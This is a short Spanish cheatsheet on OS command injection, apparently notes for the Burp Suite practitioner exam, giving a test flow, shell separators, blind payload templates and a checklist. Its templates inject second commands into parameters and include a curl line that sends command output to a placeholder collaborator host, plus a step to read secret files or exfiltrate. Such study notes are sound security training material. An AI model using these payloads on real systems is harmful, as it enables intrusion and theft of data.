---
tipo: cheatsheet
vuln: cmdi
tags: [bscp, tipo/cheatsheet, vuln/cmdi]
relacionada: "[[Command-Injection]]"
---

# CS · Command Injection

## Flujo repetible
1. Identifica {{PARAM}} que alimente un comando del sistema.
2. Inyecta un separador + {{CMD}}.
3. Si no ves salida, usa retardo o OAST/exfil a {{COLLAB}}.

## Detección
```
& {{CMD}} &      ; {{CMD}} ;      | {{CMD}}      $( {{CMD}} )      ` {{CMD}} `
```

## Plantillas de payload
```
# Ciego
& ping -c 10 127.0.0.1 &              (retardo)
& nslookup {{COLLAB}} &               (OAST)
& curl http://{{COLLAB}}/?x=$({{CMD}}) &
& {{CMD}} > /var/www/images/out.txt & (redirigir salida a la web)
```

## Escalada al objetivo
RCE → leer {{SECRET_PATH}} o exfiltrar.

## Checklist
- [ ] Probé varios separadores
- [ ] Confirmé ejecución (retardo u OAST)
- [ ] Recuperé la salida (directa, fichero o OOB)

## Referencias
- https://portswigger.net/web-security/os-command-injection
